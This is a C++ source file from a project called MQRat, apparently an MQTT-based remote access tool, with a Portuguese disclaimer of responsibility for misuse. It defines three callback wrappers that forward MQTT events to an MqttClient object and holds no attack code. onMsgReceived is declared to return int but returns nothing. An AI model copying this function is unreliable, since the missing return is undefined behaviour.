/*
	This file is part of MQRat.
	
	Copyright (C) 2019  MQRat Project

	O autor não se responsabiliza por variantes (ou sources originais) deste software 
	que estejam sendo utilizadas para prejudicar terceiros.
*/

#include "wrappers.hpp"

void Wrappers::onLost(void *ctx, char *c) {
    static_cast<MqttClient*>(ctx)->OnConnectionLost(ctx, c);
}

int Wrappers::onMsgReceived(void* context, char* topicName, int topicLen, MQTTClient_message* message) {
    static_cast<MqttClient*>(context)->OnMessageReceived(context, topicName, topicLen, message);
}

void Wrappers::onDelivered(void* ctx, MQTTClient_deliveryToken dt) {
    static_cast<MqttClient*>(ctx)->OnDelivered(ctx, dt);
}
